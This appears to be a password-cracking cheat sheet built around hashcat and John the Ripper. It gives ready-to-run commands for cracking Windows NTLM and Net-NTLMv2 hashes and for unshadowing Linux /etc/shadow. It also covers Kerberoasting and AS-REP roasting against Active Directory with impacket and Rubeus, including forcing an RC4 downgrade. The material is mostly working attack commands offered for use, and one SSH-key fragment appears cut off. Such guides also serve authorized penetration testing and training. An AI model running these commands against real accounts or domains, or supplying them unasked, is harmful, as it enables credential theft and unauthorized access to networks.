💡 Attack Strategy Guide
1
Dictionary Attack (fastest first pass)
hashcat -m MODE hash.txt rockyou.txt
Tries every word in the wordlist as-is. Start here always.
2
Dictionary + Rules (best bang for buck)
hashcat -m MODE hash.txt rockyou.txt -r best64.rule
Mutates wordlist with common patterns: capitalize, append numbers, leet speak.
3
Dictionary + Aggressive Rules
hashcat -m MODE hash.txt rockyou.txt -r rockyou-30000.rule
30,000 mutations per word. Slow but comprehensive.
4
Mask Attack (pattern-based brute force)
hashcat -a 3 -m MODE hash.txt '?u?l?l?l?l?d?d?s'
When you know the password pattern. Much faster than full brute force.
5
Hybrid Attack (wordlist + mask)
hashcat -a 6 -m MODE hash.txt rockyou.txt '?d?d?d?s'
Appends mask to every word: password123!, Winter2024#
6
Combinator (word1 + word2)
hashcat -a 1 -m MODE hash.txt wordlist1.txt wordlist2.txt
Combines two wordlists: sun + flower = sunflower

💻 OS Hashes

Windows NTLM, Linux shadow, macOS hashes — complete cracking commands.

🖥 Windows — NTLM (Mode 1000)
MOST COMMON
NTLM hashes are 32 hex characters. NOT salted — identical passwords = identical hashes. Fastest hash to crack (~100 GH/s on RTX 3090). Extracted from SAM, LSASS, NTDS.dit, secretsdump.
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt
Basic dictionary attack
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Dictionary + best64 rules (recommended first attack)
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
Aggressive 30k rules
hashcat -a 3 -m 1000 ntlm.hash '?u?l?l?l?l?l?d?d?s' --increment --increment-min=8
Mask: Ulllllldd! (common AD policy)
hashcat -a 6 -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt '?d?d?d?s'
Hybrid: word + 3 digits + special (password123!)
hashcat -m 1000 secretsdump.txt rockyou.txt --username
Crack secretsdump output (MUST use --username flag!)
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.hash
JtR alternative
secretsdump format: user:RID:LMhash:NThash::: — field 4 is the NTLM. Without --username hashcat fails SILENTLY.
📡 Net-NTLMv2 (Mode 5600)
RESPONDER
Captured via Responder/MITM. Format: user::DOMAIN:challenge:response:blob. CANNOT be used for Pass-the-Hash — must be cracked.
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
Crack Net-NTLMv2
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
With rules
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.hash
JtR auto-detects netntlmv2
🐧 Linux — sha512crypt $6$ (Mode 1800)
DEFAULT
Default on most modern Linux distros. Salted + many rounds = SLOW to crack. Extract from /etc/shadow (root required).
unshadow /etc/passwd /etc/shadow > unshadowed.hash
Step 1: Combine passwd + shadow
hashcat -m 1800 unshadowed.hash /usr/share/wordlists/rockyou.txt
Crack sha512crypt (slow — use GPU)
hashcat -m 1800 unshadowed.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
With rules
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hash
JtR auto-detects

🏢 Active Directory & Kerberos Hashes

Kerberoast, AS-REP Roast, DCC2, and other AD-specific hashes.

Kerberoast TGS-REP (Mode 13100)
CRITICAL
Any domain user can request TGS tickets for accounts with SPNs. The ticket is encrypted with the service account's password hash — crack offline.
impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/user:password -request -outputfile tgs.hash
Step 1: Request TGS from Linux
Rubeus.exe kerberoast /outfile:tgs.hash
Step 1 (Windows): Kerberoast with Rubeus
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Step 2: Crack TGS-REP with rules
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
Aggressive rules if best64 fails
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs.hash
JtR alternative
Kerberoast AES (Mode 19700)
ETYPE 17/18
AES-encrypted TGS tickets are MUCH slower to crack than RC4 (mode 13100). If possible, downgrade to RC4 during the request.
hashcat -m 19700 tgs_aes.hash /usr/share/wordlists/rockyou.txt
Crack AES Kerberoast (etype 18)
Rubeus.exe kerberoast /tgtdeleg /outfile:tgs.hash
Force RC4 downgrade with /tgtdeleg (if supported)
AS-REP Roast (Mode 18200)
Targets accounts with "Do not require Kerberos pre-authentication". No credentials needed to attack — just valid usernames.
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.hash
Step 1: Get AS-REP from Linux (no creds needed)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
Step 1 (Windows): AS-REP Roast with Rubeus
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Step 2: Crack AS-REP
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash
JtR alternative

Hashcat (may fail on modern keys — use JtR as fallback)
Modern SSH keys use aes-256-ctr cipher which Hashcat may not support. JtR is the safer choice for SSH keys.

🔧 Troubleshooting

Common errors, fixes, and tips for successful hash cracking.

⚠️ "No hashes loaded" / "Token length exception"
MOST COMMON
1
Wrong Hashcat mode (-m)
Verify your hash type with: hashid -m 'HASH' or nth --text 'HASH'
2
Windows CRLF line endings
Fix: sed -i 's/\r//' hash.txt — Always run after copy-pasting from Windows
3
Filename prefix from *2john tools
Fix: sed -i 's/^Database://' hash.txt — Remove prefixes like "Database:", "id_rsa:", etc.
4
Leading asterisk in MySQL hashes
Fix: sed 's/^\*//' mysql.hash > clean.hash
5
BOM (Byte Order Mark) in file
Fix: sed -i '1s/^\xEF\xBB\xBF//' hash.txt — Check with: cat hash.txt | xxd | head
cat hash.txt | xxd | head
Inspect raw hex to find invisible characters
sed -i 's/\r//' hash.txt
